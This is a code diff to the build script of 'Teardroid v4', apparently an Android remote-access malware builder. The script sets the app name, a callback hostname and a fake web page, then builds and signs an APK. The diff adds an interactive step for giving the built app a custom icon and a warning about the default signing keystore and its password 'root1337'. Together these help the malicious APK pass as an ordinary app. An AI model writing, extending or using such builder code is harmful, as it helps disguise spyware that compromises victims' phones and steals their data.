@@ -51,7 +51,18 @@ def banner() -> str:
     f = Figlet(font='slant')
     return f.renderText("Teardroid v4")
 
-
+def icon_change_tutorial() -> str:
+    Tutorial = r"""Please navigate to the website https://easyappicon.com using your preferred web browser. 
+From there, you may upload the desired image to be used as the icon for your application. 
+The website will generate a compressed ZIP file containing all the necessary files. 
+Once the ZIP file has been downloaded, 
+extract its contents to a folder of your choosing.
+inside that folder there will be a android folder containing all the necessary files.
+copy the android folder full path and paste it into the promote.
+or leave it blank if you want to use the default icon.
+example: D:\xxxx\ic_launcher-6446b783efdd6\ic_launcher-6446b783efdd6\android"""
+    return Tutorial
+    
 def builder(name: str) -> None:
     APKTOOL = None
     try:
@@ -65,9 +76,20 @@ def builder(name: str) -> None:
         print("GoodBye")
 
     Teardroid = TeardroidBuilder(name)
+    Teardroid.print_result(icon_change_tutorial())
+    Icon_path = input("Android icon folder path (leave blank if you wanna go with the default icon): ")
+    if Icon_path != "" and Icon_path != None:
+        if os.path.isdir(Icon_path):
+            Teardroid.Change_icon(Icon_path)
+        else:
+            Teardroid.print_result("Invalid Icon path location")
+            sys.exit(0)
     if os.path.isfile(name + ".apk"):
         Teardroid.print_result("Removing old APK")
         os.remove(name + ".apk")
+    if Teardroid.key_config.ks == "hacksec.jks" and Teardroid.key_config.ks_pass == "root1337":
+        Teardroid.print_result("using the default keystore to sing the apk its not recommended")
+        Teardroid.print_result("create a new keystore and change the values in the config.py file to use your own keystore instead")
     Teardroid.changeAppname()
     Teardroid.changeHostname(url)
     Teardroid.ChangeFakeWebPage(fake_web_page)
